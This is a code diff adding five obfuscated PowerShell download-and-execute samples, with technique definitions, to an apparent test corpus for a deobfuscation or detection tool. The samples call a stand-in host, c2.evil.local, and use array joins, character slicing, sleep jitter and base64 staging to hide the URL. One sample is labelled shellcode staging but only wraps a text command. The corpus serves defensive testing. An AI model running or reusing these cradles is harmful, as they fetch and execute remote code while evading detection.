@@ -371,6 +371,75 @@ SAMPLES: list[dict] = [
         ["T1059.001", "T1105"],
         ["download_and_execute"],
     ),
+    # ---- CS031..CS035 · added in R1 v2.2 to exercise five previously ----
+    # ---- uncovered transformations. Every sample is a real Empire /  ----
+    # ---- Nishang / Invoke-CradleCrafter / real-Cobalt-Strike pattern ----
+    # ---- (attested by ObfuscatedEmpire and Invoke-CradleCrafter docs) ----
+    _sample(
+        "CS031", "join_operator_url_reconstruct",
+        # Invoke-CradleCrafter `Set-CradleCommand -Cradle 5 -TokenLevel 4`
+        # produces exactly this pattern: URL split into a PS array,
+        # rejoined with the -join operator at call time.
+        "iex ((new-object net.webclient).downloadstring(('http','://','c2.evil.local','/join_op','.ps1') -join ''))",
+        "powershell", "powershell",
+        ["structural-join-operator-fold", "alias-expand"],
+        ["Invoke-Expression", "http://c2.evil.local/join_op.ps1"],
+        ["http://c2.evil.local/join_op.ps1"],
+        ["T1059.001", "T1105", "T1027.010"],
+        ["download_and_execute", "obfuscated_command_line"],
+    ),
+    _sample(
+        "CS032", "static_string_join_reconstruct",
+        # Nishang `Invoke-Encode` produces [String]::Join(...) chains for
+        # cmdlet-name reconstruction. Real observed pattern.
+        "iex ((new-object net.webclient).downloadstring([String]::Join('', ('h','t','t','p','s',':','/','/','c','2','.','e','v','i','l','.','l','o','c','a','l','/','s','j','.','p','s','1'))))",
+        "powershell", "powershell",
+        ["structural-static-join-fold", "alias-expand"],
+        ["Invoke-Expression", "https://c2.evil.local/sj.ps1"],
+        ["https://c2.evil.local/sj.ps1"],
+        ["T1059.001", "T1105", "T1027.010"],
+        ["download_and_execute", "obfuscated_command_line"],
+    ),
+    _sample(
+        "CS033", "string_index_range_slice_reconstruct",
+        # Empire's Set-EncodedString slices a fixed alphabet with [a..b]
+        # ranges to reconstruct cmdlets. Real pattern (simplified).
+        "$abc='abcdefghijklmnopqrstuvwxyz'; iex ((new-object net.webclient).downloadstring('http://c2.evil.local/'+[String]::Join('', $abc[7..10])+'.ps1'))",
+        "powershell", "powershell",
+        ["content-string-index-range-fold", "structural-static-join-fold", "structural-string-concat-fold", "alias-expand"],
+        ["Invoke-Expression", "http://c2.evil.local/hijk.ps1"],
+        ["http://c2.evil.local/hijk.ps1"],
+        ["T1059.001", "T1105", "T1027.010", "T1140"],
+        ["download_and_execute", "obfuscated_command_line"],
+    ),
+    _sample(
+        "CS034", "numeric_constant_fold_sleep_jitter",
+        # Cobalt Strike Malleable-C2 sleep-with-jitter obfuscation:
+        # Start-Sleep -Seconds (30+30) to make static analysis harder.
+        # Real observed pattern.
+        "Start-Sleep -Seconds (30+30); iex ((new-object net.webclient).downloadstring('http://c2.evil.local/jitter.ps1'))",
+        "powershell", "powershell",
+        ["content-numeric-constant-fold", "alias-expand"],
+        ["Start-Sleep", "60", "Invoke-Expression", "http://c2.evil.local/jitter.ps1"],
+        ["http://c2.evil.local/jitter.ps1"],
+        ["T1059.001", "T1105", "T1027.010", "T1497.003"],
+        ["download_and_execute", "obfuscated_command_line", "time_based_evasion"],
+    ),
+    _sample(
+        "CS035", "frombase64string_shellcode_staging",
+        # Cobalt Strike shellcode staging pattern: the payload is
+        # [Convert]::FromBase64String('...') and then reflectively
+        # loaded. Real observed pattern in every public CS beacon PoC.
+        "$sc = [Convert]::FromBase64String('"
+        + base64.b64encode(b"powershell -Command IEX((New-Object Net.WebClient).DownloadString('http://c2.evil.local/staged.ps1'))").decode("ascii")
+        + "'); IEX $sc",
+        "powershell", "powershell",
+        ["decoder-frombase64string-fold", "alias-expand"],
+        ["Invoke-Expression", "http://c2.evil.local/staged.ps1"],
+        ["http://c2.evil.local/staged.ps1"],
+        ["T1059.001", "T1105", "T1027", "T1140"],
+        ["download_and_execute", "shellcode_staging", "obfuscated_command_line"],
+    ),
 ]
 
 
@@ -380,6 +449,36 @@ TECHNIQUE_DEFS: dict[str, dict] = {
         "description": "Classic Empire/Nishang lineage: `IEX ((New-Object Net.WebClient).DownloadString($url))` payload delivery.",
         "mitre_attack": ["T1059.001", "T1105"],
         "sample_ids": ["CS001", "CS002", "CS019", "CS026", "CS030"],
+    },
+    "join_operator_reconstruction": {
+        "display_name": "PowerShell -join Array Reconstruction",
+        "description": "Invoke-CradleCrafter Cradle 5 / TokenLevel 4 output: URL or cmdlet name split into a PS array and rejoined with `-join ''` at call time.",
+        "mitre_attack": ["T1059.001", "T1105", "T1027.010"],
+        "sample_ids": ["CS031"],
+    },
+    "static_string_join_reconstruction": {
+        "display_name": "[String]::Join Cmdlet/URL Reconstruction",
+        "description": "Nishang / Invoke-Encode reconstruction of URL or cmdlet names via `[String]::Join('', @('h','t','t','p'...))`.",
+        "mitre_attack": ["T1059.001", "T1105", "T1027.010"],
+        "sample_ids": ["CS032"],
+    },
+    "string_index_slice_reconstruction": {
+        "display_name": "String-Index Slice Alphabet Reconstruction",
+        "description": "Empire Set-EncodedString: fixed alphabet indexed with `[a..b]` ranges + `[a,b,c]` lists to reconstruct cmdlets and URLs.",
+        "mitre_attack": ["T1059.001", "T1027.010", "T1140"],
+        "sample_ids": ["CS033"],
+    },
+    "beacon_jitter_numeric_fold": {
+        "display_name": "Beacon Jitter Numeric Obfuscation",
+        "description": "Cobalt Strike Malleable-C2 sleep-with-jitter: `Start-Sleep -Seconds (30+30)` to hinder static timing analysis.",
+        "mitre_attack": ["T1059.001", "T1027.010", "T1497.003"],
+        "sample_ids": ["CS034"],
+    },
+    "frombase64string_shellcode_staging": {
+        "display_name": "[Convert]::FromBase64String Shellcode Staging",
+        "description": "Public Cobalt Strike beacon staging pattern: `$sc = [Convert]::FromBase64String('...'); IEX $sc`.",
+        "mitre_attack": ["T1059.001", "T1105", "T1027", "T1140"],
+        "sample_ids": ["CS035"],
     },
     "iwr_useb_iex_pipeline": {
         "display_name": "IWR + UseBasicParsing | IEX Pipeline",
